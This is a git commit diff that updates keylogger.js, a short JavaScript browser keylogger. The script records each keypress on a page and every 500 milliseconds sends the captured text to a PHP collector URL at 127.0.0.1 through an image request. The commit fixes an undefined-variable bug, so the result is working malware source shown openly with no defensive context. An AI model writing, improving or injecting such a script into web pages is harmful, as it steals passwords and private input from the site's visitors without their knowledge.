c14a7d4e88b1f65f47a7791afeb28e039e267d49
steandjam <42635793+steandjam@users.noreply.github.com>
2019-02-12 13:58:48 +0000

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,17 +1,14 @@
 var keys='';
-var url = 'http://127.0.0.1/keylogger.php?c=';
-
 document.onkeypress = function(e) {
-	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
+  get = window.event?event:e;
+  key = get.keyCode?get.keyCode:get.charCode;
+  key = String.fromCharCode(key);
+  keys+=key;
 }
 window.setInterval(function(){
-	if(k.length>0) {
-		new Image().src = url+keys;
-		keys = '';
-	}
-}, 1000);
-
+if(keys != '') {
+  new Image().src = 'http://127.0.0.1/keylogger/keylogger.php?c='+keys;
+  keys = '';
+}
+}, 500);
 
